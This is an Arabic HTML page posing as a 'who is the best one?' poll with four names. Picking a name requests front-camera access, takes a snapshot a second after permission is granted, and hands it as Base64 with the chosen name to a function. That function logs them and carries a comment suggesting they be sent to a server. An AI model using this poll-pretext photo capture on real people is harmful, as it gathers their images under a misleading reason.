<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استبيان التقييم</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background-color: #ffffff;
            width: 100%;
            max-width: 450px;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
            padding: 24px;
            text-align: center;
        }

        .datetime {
            font-size: 14px;
            color: #65676b;
            margin-bottom: 12px;
            font-weight: 500;
        }

        .header-box {
            background-color: #1877f2;
            color: #ffffff;
            padding: 20px;
            border-radius: 12px;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 24px;
            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3);
        }

        .options-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .option-btn {
            background-color: #f0f2f5;
            color: #1c1e21;
            border: 2px solid transparent;
            padding: 16px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .option-btn:hover {
            background-color: #e4e6eb;
            border-color: #1877f2;
        }

        .option-btn:active {
            transform: scale(0.98);
        }

        #webcam {
            width: 100%;
            border-radius: 10px;
            margin-top: 15px;
            display: none;
        }

        #canvas {
            display: none;
        }

        .status-msg {
            margin-top: 15px;
            font-size: 15px;
            font-weight: bold;
            color: #28a745;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- التاريخ والوقت في الأعلى -->
    <div class="datetime" id="currentDateTime">جاري تحميل الوقت...</div>

    <!-- المربع الكبير -->
    <div class="header-box">
        مين أحسن واحد؟
    </div>

    <!-- الخيارات الأربعة بخط عريض -->
    <div class="options-container">
        <button class="option-btn" onclick="selectOption('عبد القادر')">عبد القادر</button>
        <button class="option-btn" onclick="selectOption('خالد')">خالد</button>
        <button class="option-btn" onclick="selectOption('كرم')">كرم</button>
        <button class="option-btn" onclick="selectOption('أحمد')">أحمد</button>
    </div>

    <!-- عناصر الكاميرا والتقاط الصورة -->
    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <div class="status-msg" id="statusMessage"></div>
</div>

<script>
    // تحديث التاريخ والوقت المباشر
    function updateDateTime() {
        const now = new Date();
        const options = { 
            weekday: 'long', 
            year: 'numeric', 
            month: 'long', 
            day: 'numeric', 
            hour: '2-digit', 
            minute: '2-digit', 
            second: '2-digit',
            hour12: true 
        };
        document.getElementById('currentDateTime').innerText = now.toLocaleDateString('ar-EG', options);
    }
    setInterval(updateDateTime, 1000);
    updateDateTime();

    // عند الضغط على أي خيار
    async function selectOption(name) {
        const status = document.getElementById('statusMessage');
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');

        status.style.color = '#1877f2';
        status.innerText = `تم اختيار ${name}. جاري طلب إذن الكاميرا...`;

        try {
            // طلب إذن المتصفح لفتح الكاميرا الأمامية
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: false 
            });

            video.srcObject = stream;
            video.style.display = "block";

            // الانتظار لمدة ثانية واحدة بعد موافقة المستخدم لالتقاط الصورة فوراً
            setTimeout(() => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // التقاط اللقطة من الفيديو
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // إيقاف عمل الكاميرا بعد التقاط الصورة
                stream.getTracks().forEach(track => track.stop());
                video.style.display = "none";

                // تحويل الصورة إلى صيغة Base64
                const imageData = canvas.toDataURL('image/png');

                status.style.color = '#28a745';
                status.innerText = "تم التقاط الصورة بنجاح!";

                // إرسال البيانات (الاسم المختار + الصورة)
                handleCapturedImage(name, imageData);
            }, 1000);

        } catch (error) {
            status.style.color = '#dc3545';
            status.innerText = "تم رفض إذن الكاميرا أو الجهاز لا يدعم الكاميرا.";
            console.error("Camera Error: ", error);
        }
    }

    // دالة المعالجة بعد التقاط الصورة
    function handleCapturedImage(selectedName, imageBase64) {
        console.log("الاسم المختار:", selectedName);
        console.log("بيانات الصورة (Base64):", imageBase64);
        // هنا يمكنك إضافة كود إرسال البيانات إلى خادم أو خزنها حسب حاجتك
    }
</script>

</body>
</html>
